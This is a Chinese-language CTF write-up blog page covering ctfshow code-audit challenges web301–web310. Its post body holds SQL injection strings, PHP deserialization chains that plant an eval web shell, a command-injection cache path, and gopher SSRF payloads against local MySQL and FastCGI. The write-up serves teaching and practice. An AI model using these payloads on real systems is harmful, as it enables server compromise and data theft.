@@ -1,0 +1,621 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+<meta name="google-site-verification" content="eFIczS6pLawspui5Sm7JUbsaANiKGnqjmDod70iSzI4" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yq1ng.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="web301 web302 web303 &amp; 304 web305 web306 web307 web308 web309 web310">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow 代码审计">
+<meta property="og:url" content="http://yq1ng.github.io/z_post/ctfshow-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/index.html">
+<meta property="og:site_name" content="会下雪的晴天">
+<meta property="og:description" content="web301 web302 web303 &amp; 304 web305 web306 web307 web308 web309 web310">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.k184sfkpbv.png">
+<meta property="article:published_time" content="2020-12-16T13:55:48.000Z">
+<meta property="article:modified_time" content="2020-12-19T16:09:14.045Z">
+<meta property="article:author" content="yq1ng">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.k184sfkpbv.png">
+
+<link rel="canonical" href="http://yq1ng.github.io/z_post/ctfshow-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>ctfshow 代码审计 | 会下雪的晴天</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">会下雪的晴天</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">CTF菜鸡</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yq1ng.github.io/z_post/ctfshow-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/xiaoxin.jpg">
+      <meta itemprop="name" content="yq1ng">
+      <meta itemprop="description" content="The best way to know your strength is to fight">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="会下雪的晴天">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ctfshow 代码审计
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-12-16 21:55:48" itemprop="dateCreated datePublished" datetime="2020-12-16T21:55:48+08:00">2020-12-16</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-12-20 00:09:14" itemprop="dateModified" datetime="2020-12-20T00:09:14+08:00">2020-12-20</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctfshow/" itemprop="url" rel="index"><span itemprop="name">ctfshow</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>5.7k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>10 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <!-- TOC -->
+
+<ul>
+<li><a href="#web301">web301</a></li>
+<li><a href="#web302">web302</a></li>
+<li><a href="#web303--304">web303 &amp; 304</a></li>
+<li><a href="#web305">web305</a></li>
+<li><a href="#web306">web306</a></li>
+<li><a href="#web307">web307</a></li>
+<li><a href="#web308">web308</a></li>
+<li><a href="#web309">web309</a></li>
+<li><a href="#web310">web310</a></li>
+</ul>
+<!-- /TOC -->
+
+<a id="more"></a>
+<h1 id="web301"><a href="#web301" class="headerlink" title="web301"></a>web301</h1><p>下载源码，我还掏出seay审计了一下，没审到东西以为坏了。。。<br><code>checklogin.php</code>的sql没过滤，联合一下就好<br>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST:</span><br><span class="line">    userid&#x3D;yq1ng&#39;union select &#39;yq1ng&#39;#</span><br><span class="line">    &amp;userpwd&#x3D;yq1ng</span><br></pre></td></tr></table></figure>
+
+<h1 id="web302"><a href="#web302" class="headerlink" title="web302"></a>web302</h1><p>修改处：<code>if(!strcasecmp(sds_decode($userpwd),$row[&#39;sds_password&#39;]))&#123;</code><br>在本地试试<code>fun.php</code>自己输入一个字符串就好，和web301一样<br>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST:</span><br><span class="line">    userid&#x3D;yq1ng&#39;union select &#39;b990423bdcf65145a3ffa0a7afe47957&#39;#</span><br><span class="line">    &amp;userpwd&#x3D;yq1ng</span><br></pre></td></tr></table></figure>
+
+<h1 id="web303-amp-304"><a href="#web303-amp-304" class="headerlink" title="web303 &amp; 304"></a>web303 &amp; 304</h1><p>登陆，admin&amp;admin弱口令，看源码，新增<code>dpt.php</code>&amp;<code>dptadd.php</code>，进入，不用填直接提交，跳到<code>dptadd</code>，然后随便找一个字段报错注入（不会报错的建议去sql专区瞅瞅）有个坑，报错的<code>+</code>需要urlencode一次</p>
+<h1 id="web305"><a href="#web305" class="headerlink" title="web305"></a>web305</h1><p><code>checklogin.php</code>多了个反序列化，而且还是写文件的，写个马（不会反序列化？去专区看看）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $username;</span><br><span class="line">	<span class="keyword">public</span> $password;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$yq1ng = <span class="keyword">new</span> user();</span><br><span class="line">$yq1ng-&gt;username = <span class="string">&quot;yq1ng.php&quot;</span>;</span><br><span class="line">$yq1ng-&gt;password = <span class="string">&#x27;&lt;?php @eval($_POST[&quot;yq1ng&quot;]);?&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span>(urlencode(serialize($yq1ng)));</span><br></pre></td></tr></table></figure>
+<p>蚁剑连接之，把<code>fun.php</code>的过滤删了哈哈哈，弱口令登陆<code>admin&amp;admin</code>，就和上一题一样了，写写payload吧<br>爆表：<code>dpt_address=&amp;dpt_build_year=&amp;dpt_cert_number=&amp;dpt_has_cert=on&amp;dpt_name=&#39;%2Bupdatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e),1)%2B&#39;&amp;dpt_telephone_number=</code>  –&gt;  sds_flabag<br>爆字段：<code>dpt_address=&amp;dpt_build_year=&amp;dpt_cert_number=&amp;dpt_has_cert=on&amp;dpt_name=&#39;%2Bupdatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&quot;sds_flabag&quot;),0x7e),1)%2B&#39;&amp;dpt_telephone_number=</code>  –&gt; flag<br>flag：<code>dpt_address=&amp;dpt_build_year=&amp;dpt_cert_number=&amp;dpt_has_cert=on&amp;dpt_name=&#39;%2Bupdatexml(1,concat(0x7e,right((select flag from sds_flabag),20),0x7e),1)%2B&#39;&amp;dpt_telephone_number=</code>   自行截取</p>
+<h1 id="web306"><a href="#web306" class="headerlink" title="web306"></a>web306</h1><p>题目改了，一开始不用登陆，<code>admin&amp;admin1</code>，简单审计源码，发现在<code>class.php</code>的log类存在<code>file_put_contents</code>危险函数，<code>checklogin.php</code>处会set cookie，login和index均存在<code>unserialize</code>，想法诞生—&gt;构造pop链子触发写文件函数，全局搜索log没有发现，最后在<code>dao.php</code>有log同名函数<code>close</code>，简单链子出现 —- <code>dao-&gt;log-&gt;file_put_contents</code>，先登录，然后修改cookie<br>两个低级错误，感谢Y4大佬耐心解答</p>
+<ol>
+<li>一开始在浏览器发的cookie，浏览器会自动urlencode一次，可能导致失败</li>
+<li>exp构造的时候忘了加<code>base64_encode</code>。。。我是废物<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: yq1ng</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>:   2020-12-18</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Challenges</span>:web306</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $config;</span><br><span class="line">    <span class="keyword">public</span> $conn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">log</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $title = <span class="string">&quot;yq1ng.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $info = <span class="string">&#x27;&lt;?php @eval($_POST[&quot;yq1ng&quot;]);?&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$yq1ng = <span class="keyword">new</span> dao;</span><br><span class="line">$yq1ng-&gt;conn = <span class="keyword">new</span> log;</span><br><span class="line"><span class="keyword">echo</span>(urlencode(base64_encode(serialize($yq1ng))));</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h1 id="web307"><a href="#web307" class="headerlink" title="web307"></a>web307</h1><p>太忙了这两天，没时间做了，简单写写<br><code>dao.php</code>里的<code>clearCache()</code>出现了<code>shell_exec()</code>危险函数，往上摸，找到pop链子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logout.php --&gt; service.php --&gt; dao.php-&gt;clearCache()</span><br></pre></td></tr></table></figure>
+<p>但是service还是通过调用dao在new config去调用clearCache()方法的，所以直接这样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logout.php --&gt; config.php --&gt; dao.php-&gt;clearCache()</span><br></pre></td></tr></table></figure>
+<p>构造exp：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: yq1ng</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>:   2020-12-19</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Challenges</span>:web307</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">config</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $cache_dir = <span class="string">&#x27;;echo  `cat /var/www/html/f*` &gt; flag.txt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $config;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$yq1ng = <span class="keyword">new</span> dao;</span><br><span class="line">$yq1ng-&gt;config = <span class="keyword">new</span> config;</span><br><span class="line"><span class="keyword">echo</span>(base64_encode(serialize($yq1ng)));</span><br></pre></td></tr></table></figure>
+<p>访问<code>URL/controller/flag.txt</code><br>路径无非/flag、/var/www/html/flag、./flag等一个一个试试，也可以写个马儿，上蚁剑，写马儿记得转义<code>$</code>，因为<code>$</code>在shell里面有特殊用处，详情<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_37766087/article/details/99974385?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromBaidu-1.control&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromBaidu-1.control">戳此处</a></p>
+<h1 id="web308"><a href="#web308" class="headerlink" title="web308"></a>web308</h1><p><code>clearCache()</code>增加过滤只能使用字母。。。换！发现增加方法<code>checkVersion()</code>，访问并关闭url，emmm，ssrf打他，用gopher协议，推荐工具 <a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus%EF%BC%8C%E6%80%9D%E8%B7%AF%E5%92%8C%E4%B8%8A%E4%B8%80%E9%A2%98%E4%B8%80%E6%A0%B7(%E6%9C%AC%E9%A2%98%E5%9C%A8index.php%E4%B8%8A%E5%81%9A%E6%89%8B%E8%84%9A)%EF%BC%8Cgopher%E5%8E%BB%E6%89%93MySQL%EF%BC%8C%E5%9C%A8%E6%BA%90%E7%A0%81%E9%87%8C%E9%9D%A2%E7%BF%BB%E5%88%B0%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%EF%BC%8Cexp%EF%BC%9A">https://github.com/tarunkant/Gopherus，思路和上一题一样(本题在index.php上做手脚)，gopher去打MySQL，在源码里面翻到账号密码，exp：</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: yq1ng</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>:   2020-12-19</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Challenges</span>:web308</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">config</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $update_url = <span class="string">&#x27;gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%51%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%40%65%76%61%6c%28%24%5f%50%4f%53%54%5b%27%79%71%31%6e%67%27%5d%29%3b%20%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%79%71%31%6e%67%2e%70%68%70%22%01%00%00%00%01&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $config;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$yq1ng = <span class="keyword">new</span> dao;</span><br><span class="line">$yq1ng-&gt;config = <span class="keyword">new</span> config;</span><br><span class="line"><span class="keyword">echo</span>(base64_encode(serialize($yq1ng)));</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.k184sfkpbv.png" alt="使用方法"></p>
+<h1 id="web309"><a href="#web309" class="headerlink" title="web309"></a>web309</h1><p>一样的脚本一样的思路，用fastcgi去打，详情<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/186186">戳此处</a>，FastCGI是用来提高CGI程序性能的。类似于CGI，FastCGI也可以说是一种协议。简单来说就是CGI的优化：对于CGI来说，每一个Web请求PHP都必须重新解析php.ini、重新载入全部扩展，并重新初始化全部数据结构。而使用FastCGI，所有这些都只在进程启动时发生一次。还有一个额外的好处是，持续数据库连接(Persistent database connection)可以工作<br>是持续连接哦，可以先ls一下，最后exp：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: yq1ng</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>:   2020-12-19</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Challenges</span>:web309</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">config</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $update_url = <span class="string">&#x27;gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%F6%06%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH58%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%09SCRIPT_FILENAMEindex.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%3A%04%00%3C%3Fphp%20system%28%27cat%20f%2A%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $config;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$yq1ng = <span class="keyword">new</span> dao;</span><br><span class="line">$yq1ng-&gt;config = <span class="keyword">new</span> config;</span><br><span class="line"><span class="keyword">echo</span>(base64_encode(serialize($yq1ng)));</span><br></pre></td></tr></table></figure>
+
+<h1 id="web310"><a href="#web310" class="headerlink" title="web310"></a>web310</h1><p>这个不会了，参考的yu师傅的<a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/111352849">博客</a>，先读配置文件，找到flag，ssrf此端口，最后exp：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: yu22x</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>:   2020-12-19</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Challenges</span>: web310</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">config</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $update_url = <span class="string">&#x27;http://127.0.0.1:4476&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> $config;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;config=<span class="keyword">new</span> config();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> dao();</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.png" alt="yq1ng 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="yq1ng 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>yq1ng
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://yq1ng.github.io/z_post/ctfshow-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="ctfshow 代码审计">http://yq1ng.github.io/z_post/ctfshow-代码审计/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/z_post/iseacms%E7%AE%80%E5%8D%95%E5%AE%A1%E8%AE%A1/" rel="prev" title="iseacms简单审计">
+      <i class="fa fa-chevron-left"></i> iseacms简单审计
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
